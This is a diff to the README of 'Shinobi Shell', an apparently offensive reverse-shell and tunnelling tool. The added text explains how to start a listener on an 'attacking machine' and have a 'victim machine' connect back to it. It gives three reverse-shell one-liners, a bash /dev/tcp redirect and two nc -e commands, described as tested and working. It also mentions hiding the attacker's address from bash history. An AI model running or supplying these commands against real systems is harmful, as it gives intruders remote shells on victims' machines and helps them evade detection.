@@ -20,11 +20,14 @@ optional arguments:
 Use:
 
 Server (Attacking box) 
-`./shinobishell.py -l 4443 -k
+`./shinobishell.py -l 4443 -k`
 
 `-l` Port server will listen on
 
 `-k` Requesting an encrypted tunnel server
+
+
+OPTION 1: Run Shinobi Shell manually on the victim machine 
 
 Client (Penetrated box) 
 `./shinobishell.py -c -k ` 
@@ -38,6 +41,28 @@ For both server and client, you'll be propmted for a password when using `-k`
 For `-c` you will be prompted at run time for the server address
 
 Both `-c` and `-k` were moved to runtime inputs to prevent leaking attacking machine address and key in bash history
+
+OPTION 2: Start a Shinobi Shell listener on your attacking machine and send it a shell
+
+Attacking Machine
+
+`./shinobishell.py -a`
+> Shinobi Tunnel Plaintext ~~ Be aware
+> Which port to listen on: 1000
+> What is the ShinobiServer address:port combination: 127.0.0.1:443
+
+
+Victim Machine
+
+Send a reverse shell 
+
+(tested and known to work)
+
+`/bin/bash -i >& /dev/tcp/127.0.0.1/1000 0>&1`
+
+`nc 127.0.0.1 1000 -e /bin/bash`
+
+`nc 127.0.0.1 1000 -e /bin/sh`
 
 ```
 Shinobi Shell v1.0
